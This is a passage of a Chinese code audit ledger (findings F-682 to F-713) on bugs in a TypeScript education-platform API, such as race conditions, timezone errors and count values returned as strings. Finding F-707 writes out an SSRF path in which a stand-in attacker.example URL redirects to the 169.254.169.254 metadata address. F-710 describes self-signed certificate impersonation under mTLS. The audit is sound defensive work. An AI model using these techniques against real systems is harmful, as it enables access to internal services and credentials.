- **证据**：`exam-extended-queries.ts:316-326` 的 `values({... isMastered:false })` 无 `dueDate`；`:329-338` 冲突分支只改 `wrongCount/lastWrongTime/isMastered`；`exam-extended.ts:114` `dueDate: timestamp(...)` 无 default；`srs-review-service.ts:64` `lte(examWrongQuestion.dueDate, threshold)`，NULL 永不匹配。
- **影响面**：所有用户 `due.list` 恒空、`stats.totalDue` 恒 0，间隔复习整体失效。
- **建议修法**：插入时写 `dueDate: now`，冲突且未掌握时重置为 `least(due_date, now)`。
- **是否当场可修**：是。

#### F-682 个推鉴权 token 无缓存，且群发扇出无并发上限

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/push-provider.ts:216-236,243,304-308`；`apps/api/src/routes/push.ts:138-155`
- **触发路径**：管理员 `POST /api/admin/push/send {memberIds:[...]}` → 每个 token 各调一次 `sendGetui`。
- **根因**：FCM token 有内存缓存，个推 `getGetuiAuthToken()` 每次重新 `/auth`；批量入口 `Promise.all` 全并发，SQL 无 LIMIT。
- **证据**：`push-provider.ts:243` `const token = await getGetuiAuthToken()`（逐 target 调用，函数体无缓存）；`:308` `return Promise.all(targets.map(...))`；`push.ts:139-144` `SELECT device_token ... WHERE member_id = ANY(...) AND is_active = true`（无 LIMIT）。
- **影响面**：一次群发上游请求数翻倍，个推鉴权限频会令整批失败；无上限放大内存/连接。
- **建议修法**：缓存个推 token（提前 60s 刷新）；批量走上游 list 接口或 p-limit 5 + 分页。
- **是否当场可修**：是。

#### F-683 转码 `resolution` 参数被静默丢弃，请求 720p/1080p 实际输出原分辨率

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/transcode-service.ts:88,192-233`；`apps/api/src/routes/transcode.ts:68,98-105`
- **触发路径**：管理员 `POST /api/transcode/jobs {inputPath, preset:'video/mp4', resolution:'720p'}`。
- **根因**：`TranscodeJob` 无 `resolution` 字段，创建时丢弃；`startTranscodeJob` 重组参数只带 `inputPath/preset`，缩放分支永不触发。
- **证据**：`transcode-service.ts:88` `const scaleFilter = input.resolution ? ... : null`；`:230-233` `const jobWithResolution: TranscodeInput = { inputPath: job.inputPath, preset: job.preset }`；`:210-219` job 对象无 resolution。
- **影响面**：产物规格与请求不符，接口仍返回成功且无告警（带宽/存储成本偏离）。
- **建议修法**：`TranscodeJob` 增加 `resolution?`，创建时写入并在启动组装时透传。
- **是否当场可修**：是。

#### F-684 复习提交“读-算-写”无事务/无版本条件，并发或重试回退 SM-2 状态

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/srs-review-service.ts:111-141`；入口 `apps/api/src/routes/srs-review.ts:46-65`
- **触发路径**：同一题快速点两次“记住了/忘了”，或客户端超时重试 `POST /api/srs-review/review`。
- **根因**：先 `SELECT` 取 `easeFactor/interval/repetition`，Node 内算完后用无版本条件的 `UPDATE ... WHERE userId+questionId` 覆盖；无事务、无乐观锁、无幂等窗口。
- **证据**：`srs-review-service.ts:111-115` 读三列；`:128-141` `sm2Calculate(...)` 后直接 `set({ easeFactor, interval, repetition, dueDate, lastReviewAt })`。
- **影响面**：后写覆盖前写，升级次数少记、间隔偏短，调度失真。
- **建议修法**：`SELECT ... FOR UPDATE` 入事务，或 `WHERE repetition = $old` 并检查 rowCount；加 60s 幂等窗口。
- **是否当场可修**：是。

#### F-685 复习连续天数混用 DB 会话时区与 Node 本地时区，北京时间 0–8 点算错

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/srs-review-service.ts:199-227`
- **触发路径**：用户在北京时间 00:00–08:00 提交复习 → `GET /api/srs-review/stats`。
- **根因**：日集合用 `to_char(last_review_at,'YYYY-MM-DD')`（DB 会话时区，默认 UTC）生成；`todayStr/yesterdayStr` 用 `formatDay`（进程本地时区）生成，两套键可差一天。
- **证据**：`:201` `d: sql<string>\`distinct to_char(${examWrongQuestion.lastReviewAt}, 'YYYY-MM-DD')\``；`:209-213` 用 `formatDay(...)` 比对；`:222-226` `formatDay` 用 `getFullYear/getMonth/getDate`。
- **影响面**：该时段复习不计入今日，连续天数断链或恒 0。
- **建议修法**：统一时区（SQL 加 `AT TIME ZONE 'Asia/Shanghai'` 或全部在 JS 侧格式化）。
- **是否当场可修**：是。

#### F-686 上传合并闸一次瞬时 Redis 故障即永久降级，直到进程重启

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/upload-merge-gate.ts:477-507,527,534-542`
- **触发路径**：多实例且配置 Redis provider；进程首次 `runExclusive` 时 Redis 未就绪/抖动。
- **根因**：`ensureSemaphore` catch 置 `degraded = true` 并把 `semaphoreInit` 永久缓存为已 resolve 的 `null`；全文件无恢复路径，注释却声称“允许后续重建”。
- **证据**：`:488-493` catch 中 `degradeFromError(err); return null`；`:500-502` `degraded = true`；`:527` `if (degraded) return inner.runExclusive(...)`；`:539-540` provider 返回 null 同样永久降级。
- **影响面**：集群级合并并发上限退化为“每实例各限 N”，无自动恢复。
- **建议修法**：降级带截止时间并半开重试；成功即 `degraded=false; semaphoreInit=null`。
- **是否当场可修**：是。

#### F-687 FCM `data` 值未转字符串，含数字/布尔/嵌套时整批推送 400

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/push-provider.ts:176-183,44-53`；`apps/api/src/routes/push.ts:28`
- **触发路径**：`POST /api/admin/push/send {..., data:{orderId:123, vip:true}}`，provider=fcm。
- **根因**：`PushMessage.data` 为 `Record<string, unknown>`，路由 schema 亦为 unknown；FCM v1 要求 `map<string,string>`，非字符串值返回 400。
- **证据**：`push-provider.ts:180` `data: message.data ?? {}`；`:52` `data?: Record<string, unknown>`；`push.ts:28` `z.record(z.string(), z.unknown())`。
- **影响面**：带结构化 data 的推送在 FCM 通道 100% 失败，个推不受影响（双通道行为不一致）。
- **建议修法**：发送前统一 `JSON.stringify` 非字符串值，或 schema 收紧为 `z.record(z.string(), z.string())`。
- **是否当场可修**：是。

#### F-688 直播回调解重 Map 无硬上限，超 1000 条后每次 insert 全表扫描且仅清过期项

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/tencent-live-service.ts:19,95-105`
- **触发路径**：`POST /api/live/tencent/callback` 高频回调，10 分钟窗口内新增 >1000 条。
- **根因**：只按时间 TTL 裁剪；条件 `size > 1000` 时仍只删除超过 10 分钟的项，条目只增不减。
- **证据**：`:19` `const processedEventIds = new Map<string, number>()`；`:100-105` `set(...)` 后 `for (...) if (now - v > IDEMPOTENCY_WINDOW_MS) delete`。
- **影响面**：回调洪峰下 O(n²) 遍历与无界内存。
- **建议修法**：硬上限按插入顺序淘汰，或换 Redis TTL/LRU。
- **是否当场可修**：是。

### B 路：db 查询层（F-689 ~ F-697）

#### F-689 开发者套餐回调重放重复插入订阅（无幂等键）

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/order-service.ts:360-366,567-591`；`apps/api/src/db/developer-queries.ts:70-94`；`packages/database/src/schema/developer.ts:71`；`apps/api/src/routes/payment-gateway.ts:737`
- **触发路径**：支付回调重复投递 → `completeOrderWithSaga` 对已 paid 订单返回 success → 调用方无条件 `activateOrderSubscription` → `orderType===5` 分支再插一条订阅。
- **根因**：订阅激活不以 `orderId` 幂等；`developer_subscriptions.order_id` 只有普通外键，无唯一索引（对比 `orderType=6` 用 `orderNo` 幂等）。
- **证据**：`developer-queries.ts:79-90` 直接 `insert(developerSubscriptions).values({..., orderId})`；`developer.ts:71` `orderId: uuid('order_id').references(...)`；`payment-gateway.ts:737` 无条件调用。
- **影响面**：同一订单多条订阅，续费剩余期/财务对账失真。
- **建议修法**：`order_id` 唯一索引 + `onConflictDoNothing`，或先按 orderId 查重；激活与订单状态转换同事务。
- **复核结论**：坐实（P2）。已修 2026-11-08（commit ec2f95556f）：`order_id` 唯一索引 + `onConflictDoNothing` + 回查；迁移 `packages/database/drizzle/20261108130000_developer_subscription_order_unique.sql`（存量按 order_id 去重保留最早一条；事务内 DDL 持表级锁，建议低峰执行；回滚可恢复普通索引，但去重 DELETE 不可逆，需执行前备份）。夹具 `tests/developer-subscription-idempotent-689.test.ts` 改前 5 红→改后 6 绿。数字对照：199 元/30 天订单重放两次，改前 2 条订阅/60 天/等价计账 398 元，改后 1 条/30 天/计账 199 元。
- **是否当场可修**：是（2026-11-08 已修）。

#### F-690 禁用（status=0）试卷仍出现在公开列表、可开考、可取题

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/exam-queries.ts:118,198`；`apps/api/src/routes/exam.ts:526,554,595`
- **触发路径**：后台把试卷 `status=0` 但保留 `is_published=true` → `GET /exam/papers`、`/:id`、`/:id/questions`、`/:id/start` 全部照常命中。
- **根因**：判据只取 `isPublished`，漏 `status`；同文件 `findPublishedExamCategories` 却同时判 `status=1`，口径自相矛盾。
- **证据**：`exam-queries.ts:118` `const conds = [eq(examPapers.isPublished, true)]`；`:198` `.where(and(eq(examPapers.isPublished, true), ...))`；`routes/exam.ts:526` `if (!paper || !paper.isPublished)`。
- **影响面**：下架对学员无效，可进入已禁用试卷答题并产生 `exam_records`。
- **建议修法**：两处追加 `eq(examPapers.status, 1)`，路由判据补 `paper.status !== 1`。
- 复核结论：坐实（P2）。`exam-queries.ts:118,198` 只判 `is_published`；`routes/exam.ts:526,554,595` 只判 `isPublished`，`status=0` 仍可进列表/取题/开考并落 `exam_records`。已修，夹具 `tests/exam-disabled-paper-690.test.ts` 改前 5 红→改后 6 绿。
- 是否当场可修：是（2026-11-08 已修）。

#### F-691 公开专题详情返回未发布（草稿）课程

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/topic-queries.ts:91`；`apps/api/src/routes/topic.ts:85-90`
- **触发路径**：`GET /topics/:id`，其中 `lesson_ids` 含未发布课程。
- **根因**：关联课程只过滤 `status=1`，未过滤 `isPublished`；而 `lessons.is_published` 默认 false、`status` 默认 1。
- **证据**：`topic-queries.ts:91` `.where(and(inArray(lessons.id, ids), eq(lessons.status, 1)))`；`schema/learn.ts:75` `isPublished ... default(false)`。
- **影响面**：草稿课程标题/价格/简介/封面被公开泄露。
- **建议修法**：谓词追加 `eq(lessons.isPublished, true)`。
- 复核结论：坐实（P3，台账「否」为误标）。`topic-queries.ts:91` 只判 `status=1`；`schema/learn.ts:75` `isPublished` 默认 false。已修：公开面补 `isPublished`，管理员预览显式 `includeUnpublished`；夹具 `tests/topic-draft-lessons-691.test.ts` 改前红→改后 3 绿。
- 验证缺口：`tests/topic-routes.real.test.ts` 因本机无 `.env.test`（`.real` 套件默认 exclude）未能执行 ⇒ **未判定**，不得据此转绿。
- 是否当场可修：是（2026-11-08 已修）。

#### F-692 浏览记录读改写非原子：并发丢时长 + 首次并发直接 500

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/behavior-queries.ts:31-67`；`apps/api/src/routes/behavior.ts:161-168`
- **触发路径**：播放页心跳与切页同时触发两次 `POST /behavior/watch`。
- **根因**：先 `SELECT` 再 `UPDATE`，非原子；表上 `(user_id, topic_id, topic_type)` 唯一。
- **证据**：`behavior-queries.ts:48` `watchDuration: (row.watchDuration ?? 0) + watchDuration`；`routes/behavior.ts:166` 无 try/catch 直接 `await recordWatch(...)`。
- **影响面**：观看时长少记；首次并发双双 INSERT，后者唯一冲突冒泡为 500。
- **建议修法**：单条 `INSERT ... ON CONFLICT ... DO UPDATE SET watch_duration = behavior_watch_records.watch_duration + excluded.watch_duration`。
- 复核结论：坐实（P3，待修）。`behavior-queries.ts:31-53` 先 SELECT 再 UPDATE 覆盖写 `watchDuration`，并发丢增量；`:57-67` 首次插入无冲突兜底，唯一键冲突冒泡 500；`routes/behavior.ts:166` 无 try/catch，失败直接 500。
- 已修（`becc864f28`）：`behavior-queries.ts:26-75` 收敛为单条 `INSERT ... ON CONFLICT (user_id,topic_id,topic_type) DO UPDATE SET watch_duration = behavior_watch_records.watch_duration + excluded.watch_duration`，`RETURNING (xmax = 0)` 区分首插/更新；`routes/behavior.ts:161-176` 补 try/catch 但仍返回 500（不静音）。夹具 `tests/behavior-watch-atomic-692.test.ts` 覆盖空表并发首写、已有行并发各 +10（改前终值 10 → 改后 20）、重放 3×10；`tests/behavior-watch-route-692.test.ts` 改前裸冒泡「服务器错误」→ 改后业务 500。
- 是否当场可修：是（2026-11-08 已修）。

#### F-693 含主观题提交即落 `graded`，人工阅卷后反写 `submitted`（状态机倒置）

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/exam-queries.ts:541,608`；同型 `apps/api/src/routes/exam.ts:1972`
- **触发路径**：提交含 `subjective` 题的试卷 → 人工阅卷。
- **根因**：与同文件定义的状态机 `ANSWERING→SUBMITTED→GRADED→COMPLETED`（`exam-extended-queries.ts:489-495`）相反。
- **证据**：`exam-queries.ts:541` `const finalStatus = hasSubjective ? 'graded' : 'submitted'`；`:608` `status: 'submitted', // 人工评分完成,最终状态`。
- **影响面**：主观题未批改即处于 `graded`；按 `status` 拉“待批改/已批改”名单全部错位。
- **建议修法**：提交时 `hasSubjective ? 'submitted' : 'graded'`，阅卷完成置 `graded`。
- 复核结论：坐实（P3，待修）。`exam-queries.ts:541` 提交即 `hasSubjective ? 'graded' : 'submitted'`；`:608` 人工阅卷完成反写 `'submitted'`，与 `exam-extended-queries.ts:489-495` 定义的状态机相反；`routes/exam.ts:1972` 同型。
- 已修（`becc864f28`）：改错侧 `exam-queries.ts:585`（有主观题→`submitted`，否则→`graded`）、`:652`（阅卷完成→`graded`）与 `routes/exam.ts:1981`；保留权威侧 `exam-extended-queries.ts:489-496`。判定依据：`checkAndUpdateStatus` 的调用面 `gradeExam`/`completeExam`，以及 `routes/exam-marking.ts:53-56` 只允许 `status='submitted'` 评分、web 端按 `submitted→reviewing / graded→completed` 展示。自动重判路由补 `status='submitted'` 守卫（409），禁止 `graded/completed` 回退。夹具 `tests/exam-status-machine-693.test.ts`（提交/阅卷/重放不回写）与 `tests/exam-status-route-693.test.ts`（路由含主观题落 `submitted`、已 `graded` 返回 409）。
- 存量数据未回填：`graded` 且含主观题的记录既可能是旧码「提交即 graded」，也可能是扩展流程里管理员已阅卷；两者 `answers`/`score`/`submittedAt` 形态相同，自动迁移会误伤 ⇒ 标记「需运营确认」，不静默转绿。
- 是否当场可修：是（2026-11-08 已修新写入；存量待运营确认）。

#### F-694 考试成绩指标被同一答题记录重复累加（提交 + 人工阅卷各一次）

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/exam-queries.ts:613`；`apps/api/src/routes/exam.ts:626`
- **触发路径**：学员提交（路由打点一次）→ 管理员阅卷 `gradeSubjectiveAnswers`（db 层再打点一次）。
- **根因**：阅卷按“重新汇总后的总分”整笔累加，而非增量；提交路径已按旧总分累加过。
- **证据**：`exam-queries.ts:612-613` `recordExamScore(totalScore)`；`routes/exam.ts:626` `server.recordExamScore(result.score)`。
- **影响面**：`ihui_exam_score_sum` 偏大、平均分虚高；重复阅卷继续叠加。
- **建议修法**：阅卷路径只累加 `totalScore - record.score`，或按记录首次终态打点一次。
- 复核结论：坐实（P3，台账「否」为误标）。`routes/exam.ts:626` 提交打点一次；`exam-queries.ts:612-613` 阅卷按重汇总总分整笔再打点；`recordExamScore` 同时 sum+count 双累加（`business-metrics.ts:1174-1180`）。已修：新增 `adjustExamScore(delta)` 仅平移 sum，`gradeSubjectiveAnswers` 与 `gradeExam` 均按增量；夹具 `tests/exam-score-single-count-694.test.ts` 改前 `[50]`→改后 `[20]`。
- 是否当场可修：是（2026-11-08 已修）。

#### F-695 后台“总用户数”与用户列表 total 口径不一致（已注销用户）

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/admin-queries.ts:47-50,91-95`
- **触发路径**：同一后台首页总数 vs 用户管理列表。
- **根因**：`countUsers` 全表 COUNT；`findUsers` 默认 `notInArray(users.status,[3])`。
- **证据**：`admin-queries.ts:48` `db.select({count: sql<number>\`COUNT(*)\`}).from(users)`；`:93-94` `else if (!includeDeleted) conds.push(notInArray(users.status, [3]))`。
- **影响面**：存在注销用户时总数恒大于列表 total，增长率/导出基数偏差。
- **建议修法**：`countUsers` 默认排除 `status=3`，或仪表盘同时给 `total/deleted`。
- **是否当场可修**：否。

#### F-696 直播统计 `total` 含禁用频道，与其余三项口径不一致

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/live-queries.ts:359-381`
- **触发路径**：`GET /live/statistics`。
- **根因**：`total` 无 `status` 条件，`living/published/viewSum` 都带 `status=1`。
- **证据**：`:361` `db.select({ count: sql<number>\`count(*)::int\` }).from(liveChannels)`；`:365` `.where(and(eq(liveChannels.isLive,true), eq(liveChannels.status,1)))`。
- **影响面**：统计关系可自相矛盾，前端图表不可信。
- **建议修法**：`total` 加 `eq(liveChannels.status,1)` 或另返回 `disabled`。
- **是否当场可修**：否。

#### F-697 移动端设备分布把全部 distinct User-Agent 拉回进程再分三桶

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/mobile-stats-queries.ts:131-158`
- **触发路径**：后台移动端统计仪表盘。
- **根因**：按完整 UA 分组（数万行）后在 Node 侧正则归并，无 LIMIT。
- **证据**：`:132-136` `SELECT user_agent, COUNT(*)::int AS visits FROM visit_logs ... GROUP BY user_agent`。
- **影响面**：单次请求全量传输 + 全量遍历，内存/延迟抖动。
- **建议修法**：SQL 内 `CASE WHEN lower(user_agent) LIKE '%iphone%' ... END` 分组，只回 3 行。
- **是否当场可修**：否。

### C 路：`sql<number>` 假类型 vs 驱动 string（F-698 ~ F-706）

#### F-698 评论列表标量子查询 `COUNT(*)` 无 `::int`，点赞后计数变成字符串拼接

- **严重度**：P1
- **文件与行号**：`apps/api/src/db/comment-queries.ts:82-89`；消费点 `apps/web/src/components/business/CommentItem.tsx:57,83`
- **触发路径**：`GET /api/comments?...` → 前端点赞。
- **根因**：postgres.js 对 `int8` 返回 string，`sql<number>` 无运行时转换；`repliesCount/likeCount` 均为裸 `COUNT(*)`。
- **证据**：`comment-queries.ts:86-89`
  ```ts
  likeCount:
    sql<number>`(SELECT COUNT(*) FROM comment_likes cl WHERE cl.comment_id = ${sql.raw('comments.id')})`.as('like_count'),
  ```
  前端 `CommentItem.tsx:57` `setLikeCount(prev ? likeCount - 1 : likeCount + 1)`。
- **影响面**：原有点赞 12 → 点赞后显示 `"12" + 1 = "121"`；取消赞 `"12" - 1 = 11` 正常（不对称）。
- **建议修法**：子查询改 `COUNT(*)::int`，或 select 后统一 `Number()`。
- **是否当场可修**：可（6 处 SQL 各改一行）。

#### F-699 学习计划完成率 `count(case)` 无 `::int`，聚合字符串拼接算出 442%

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/edu-ai-management.ts:1432-1433,1450-1460`
- **触发路径**：`GET /api/edu-ai-management/study-plan/completion-stats`，该班/学期 ≥2 个学习计划。
- **根因**：`count(case ...)` 返回 int8 → string；`reduce` 从 number 0 开始做 `+` 变成字符串拼接。
- **证据**：
  ```ts
  completed: sql<number>`count(case when ${eduPlanItem.completed} = true then 1 end)`,
  ...
  const totalCompleted = stats.reduce((sum, s) => sum + s.completedItems, 0)
  ```
- **影响面**：计划 A 5/6、计划 B 3/6 → `totalCompleted = "053"`（Number=53）→ 完成率 442%，看板显示 `053` 与 `442%`；单计划时 `0+"5"="05"→5` 恰好正确，掩盖问题。
- **建议修法**：`count(case…)::int` 或对 `completedItems` 显式 `Number()`。
- **是否当场可修**：可。

#### F-700 管理端钱包统计 `SUM(integer)::int`，累计 token 超 2^31 即 22003 → 500

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/wallet.ts:314,318,322,326,332,339,346-348`
- **触发路径**：`GET /api/admin/wallet/stats`。
- **根因**：`token_flows.quantity` 为 integer，`SUM` 返回 int8 再强转 `::int`，超 2,147,483,647 抛 `integer out of range`。
- **证据**：`:314` `sql<number>\`coalesce(sum(${tokenFlows.quantity}), 0)::int\``（另 6 处同形）。
- **影响面**：累计流水过 2^31 后整个统计接口 500，后台钱包面板不可用。
- **建议修法**：`::bigint` 后 `Number()`，或 `::numeric` + 字符串契约。
- **是否当场可修**：可。

#### F-701 中转账号 24h 用量 `sum(...)::int` 溢出被 catch 吞掉，整批账号降级为全 0

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-account-usage.ts:95-97,107-116`
- **触发路径**：账号列表富化 `getAccountUsageSummaries`，任一账号 24h token 合计 > 2^31。
- **根因**：`promptTokens/completionTokens` 为 integer，SUM→int8 后 `::int`；函数“永不抛”用 catch 返回空 Map。
- **证据**：`:96` `sql<number>\`coalesce(sum(${aiRelayAccountUsageLedger.promptTokens} + ${aiRelayAccountUsageLedger.completionTokens}), 0)::int\``；`:114-116` catch 后 `logger.warn(...降级为空汇总)`。
- **影响面**：所有账号 `calls24h/tokens24h/failRate24h` 变 0，误显示“零调用零失败”。
- **建议修法**：`::bigint` + JS `Number()`；catch 区分溢出并告警。
- **是否当场可修**：可。

#### F-702 渠道配额月度用量 `coalesce(sum(...),0)::bigint::int`，当月 token 超 2^31 抛错

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/channel-quota-service.ts:540-542`
- **触发路径**：管理端 Dashboard 调 `getMonthlyUsage(keyPoolId)`。
- **根因**：`totalTokens` 是 bigint，SUM 返回 numeric 再 `::bigint::int`；`callCount` 亦同。
- **证据**：`:540-542` `callCount/totalTokens/totalCostCents` 三条均为 `coalesce(sum(...), 0)::bigint::int`。
- **影响面**：高流量渠道当月超 2.1B 时查询抛错，配额/成本面板 500 或数据缺失。
- **建议修法**：`::bigint` 后转 number，或 `::numeric` + 字符串契约。
- **是否当场可修**：可。

#### F-703 智能体详情 `SUM(agentBillings.modelInputToken)::int` 溢出 → 详情接口 500

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/agents.ts:2687-2699`
- **触发路径**：`GET /api/agents/:agentId/details`，累计计费 token 超 2^31。
- **根因**：`modelInputToken/modelOutputToken` 为 integer，SUM→int8 再 `::int`。
- **证据**：`:2687-2688` `COALESCE(sum(${agentBillings.modelInputToken}), 0)::int`（输出列同形）。
- **影响面**：长寿智能体详情接口整体 500；未发现 web 消费点，暂 P3。
- **建议修法**：`::bigint` + `Number()`。
- **是否当场可修**：可。

#### F-704 运营大屏当日 token `::bigint::int` 溢出 → 业务纵深整块“不可用”

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-ops-wallboard.ts:834`（另 `:794/:835/:859` 同形）
- **触发路径**：大屏 `buildBusiness()` 当日汇总。
- **根因**：`llmCallLogs.totalTokens` 为 integer，当日 SUM 得 int8 后 `::bigint::int`。
- **证据**：`:834` `tokens: sql<number>\`coalesce(sum(${llmCallLogs.totalTokens}), 0)::bigint::int\``；该函数失败按设计返回 null。
- **影响面**：当日 token 超 2.1B 时业务纵深（调用/token/成本/错误率）整体不可用。
- **建议修法**：token 汇总改 `::bigint` 或 `::numeric` 字符串。
- **是否当场可修**：可。

#### F-705 A/B 实验统计 `exposureCount += SUM(int)` 字符串拼接，返回 `"0100"`

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/ab-testing.ts:509-510,527-528,537-540`
- **触发路径**：`GET /api/ab-testing/stats?experimentId=...`
- **根因**：`SUM` 返回 string，聚合器初值为 number 0。
- **证据**：`:509-510` `samples: sql<number>\`COALESCE(SUM(...), 0)\``；`:527-528` `current.exposureCount += row.samples`。
- **影响面**：响应 `exposureCount:"0100"`、`conversionCount:"012"`（`conversionRate` 因除法仍正确）；当前无前端消费，P3。
- **建议修法**：SQL 加 `::int`，或 `+= Number(row.samples)`。
- **是否当场可修**：可。

#### F-706 API 用量 `errorRate/avgLatency` 为 numeric string，前端模板串渲染出 17 位小数

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/admin-monitoring-routes.ts:118-119`；前端 `apps/web/app/(main)/admin/api-usage/page.tsx:93,99`
- **触发路径**：`GET /api/admin/api-usage/stats`。
- **根因**：`avg(...)` 返回 numeric string，`sql<number>` 不转换；前端直接模板串输出。
- **证据**：`:118-119` `coalesce(avg(case when ... then 1 else 0 end) * 100, 0)` / `coalesce(avg(${apiLogs.duration}), 0)`；`page.tsx:93` `` `${stats.errorRate}%` ``。
- **影响面**：卡片显示 `1.2345678901234567%` 之类长小数（`/top` 的 `.toFixed` 崩溃已由 F-664 覆盖，此处为 `stats` 端点）。
- **建议修法**：`avg(...)::numeric(10,2)` 后 `Number()`，或前端 `Number(...).toFixed(2)`。
- **是否当场可修**：可。

### D 路：utils 与 plugins（F-707 ~ F-716）

#### F-707 `downloadFileFromUrl` 校验后改用全局 `fetch` 且 `redirect:'follow'`，SSRF 可被重定向/重绑定绕过

- **严重度**：P2（当前 src 零调用方；接线即 P1）
- **文件与行号**：`apps/api/src/utils/file-transfer.ts:129-150`
- **触发路径**：`downloadFileFromUrl('http://attacker.example/x')` → 初始 URL 过闸 → 目标 302 到 `http://169.254.169.254/...`，全局 fetch 自动跟随且新主机不再校验；或 DNS rebinding。
- **根因**：校验器与连接器不是同一解析路径（TOCTOU），且未逐跳校验。
- **证据**：`:138` `await ensureSafeFetchUrl(url)`；`:143-150` `fetch(url, { ..., redirect: 'follow' })`；`:134` 自述 src 内零调用方。
- **影响面**：通用下载原语可打内网元数据/回环管理端口。
- **建议修法**：改用 `ssrf-guard` 的 `safeFetch`（受控 dispatcher + 每跳复检），或 `redirect:'manual'` 循环逐跳校验。
- **是否当场可修**：是。

#### F-708 分布式锁 watchdog 遇到一次续约异常即永久停表，且不通知持有者

- **严重度**：P2（需 `watchdog:true`；当前无调用方开启）
- **文件与行号**：`apps/api/src/utils/distributed-lock.ts:220-235`
- **触发路径**：`tryLock(..., {watchdog:true})` → 续约时 Redis 抖动/主从切换 → catch → `stopWatchdog` 永久停止；TTL 到期后其它副本获取成功 → 临界区双持有。
- **根因**：任何异常都当作“锁已丢失”，且 `renew` 结果不向上传播。
- **证据**：`:228-230` `} catch { this.stopWatchdog(lock.name) }`。
- **影响面**：互斥失效（重复写/重复扣款类）。
- **建议修法**：连续 N 次失败才停表，并通过回调/AbortSignal 通知持有者；`renew` 加超时。
- **是否当场可修**：是。

#### F-709 watchdog 以锁名（而非 token）为键：同进程重获取泄漏旧 interval 并误杀新锁续约

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/distributed-lock.ts:156-157,234,237-243`
- **触发路径**：同进程同名锁：旧锁过期 → 再 `tryLock` 成功 → `watchdogs.set(name, timer)` 覆盖旧 timer（旧 interval 失引用、永不 `clearInterval`）；旧句柄 `release()` 或旧 timer 续约失败都会清掉新锁 watchdog。
- **根因**：watchdog 生命周期未与 token 绑定，`set` 前未清理同名旧 timer。
- **证据**：`:156-157` `release(name, token) { this.stopWatchdog(name) ... }`；`:234` `this.watchdogs.set(lock.name, timer)`。
- **影响面**：孤儿 interval 累积 + 每个周期一次 EVAL；新锁静默失续约。
- **建议修法**：watchdog 以 token 为键，`set` 前 clear 同名旧 timer，`release` 只停本 token。
- **是否当场可修**：是。

#### F-710 mTLS 降级模式下，把链校验失败的证书 CN 当成客户端身份注入

- **严重度**：P3（当前无路由配置 `cnAllowList`/读取 `mtlsClient`，契约级隐患）
- **文件与行号**：`apps/api/src/plugins/mtls.ts:190-201,214-222,242`
- **触发路径**：`required=false`（默认）时客户端出示自签证书 → `socket.authorized === false` 仅 warn 后继续 → 若路由配了 `cnAllowList`，攻击者可控 CN 通过检查并被注入 `request.mtlsClient`。
- **根因**：降级模式不区分“证书链可信”与“仅出示了证书”；CN 白名单直接信任未验证证书。
- **证据**：`:190-197` `if (socket instanceof TLSSocket && !socket.authorized) { ... logger.warn(...) }`；`:242` `request.mtlsClient = buildClientIdentity(cert)`。
- **影响面**：任何以 `mtlsClient.cn/fingerprint` 作授权判据的路由可被自签证书冒充。
- **建议修法**：`!socket.authorized` 时不注入或注入 `verified:false` 且禁止用于授权；CN 白名单仅 `authorized` 时生效。
- **是否当场可修**：是。

#### F-711 WS 跨实例限流 `MAX_PER_WINDOW=30` 完全失效，实际稳态上限为 `BURST=50`

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/ws-rate-limit.ts:111-113`（常量 `:32,:35`）
- **触发路径**：同一 1 秒窗口第 31~50 条：`count <= 30` 假、`count <= 50` 真 → 放行；第 51 条才拒绝。
- **根因**：两个阈值顺序判断且 `BURST > MAX_PER_WINDOW`，等价于单一 `count <= BURST`。
- **证据**：`:111-113` `if (count <= MAX_PER_WINDOW) return true; if (count <= BURST) return true; return false`。
- **影响面**：入站消息实际可跑 50/s（比设计高 67%）。
- **建议修法**：明确单一阈值，或改令牌桶（30/s 稳态 + 50 突发）。
- **是否当场可修**：是。

#### F-712 WS 回放用毫秒时间戳做游标，同毫秒消息重连时被漏发

- **严重度**：P3
- **文件与行号**：`apps/api/src/utils/ws-replay-buffer.ts:86,120`；使用方 `apps/api/src/plugins/ws-chat.ts:725-730`
- **触发路径**：同一毫秒内 RPUSH 两条消息（流式分片常见），客户端 `lastTs` 为该毫秒值 → 重连时 `env.ts > since` 对两条都为假。
- **根因**：毫秒时间戳不是唯一/单调游标；`>` 排除同刻所有消息。
- **证据**：`:86` `const envelope: BufferedMessage = { ts: Date.now(), data: msg }`；`:120` `if (env.ts > since)`。
- **影响面**：断线重连漏帧。
- **建议修法**：改用单调递增序号或 List 位置作游标，或 `>=` + 客户端按消息 id 去重。
- **是否当场可修**：是（需改协议字段）。

#### F-713 `calendar-boundary.toDate` 把无时区时间串按本地时区解析，日/周/月边界整体错一天

- **严重度**：P3（当前 src 无 import）
- **文件与行号**：`apps/api/src/utils/calendar-boundary.ts:70-87,111`
- **触发路径**：进程 TZ=Asia/Shanghai 时 `dayStart('2024-01-01T00:00:00')` → `new Date` 按本地解析为 `2023-12-31T16:00:00Z` → 取 `getUTCDate()`=31。
- **根因**：`:76` `s.endsWith('Z') ? s : s` 是无操作；无时区分支直接交给 `new Date`。
- **证据**：`:76-77`、`:111` `new Date(Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), d.getUTCDate()))`。
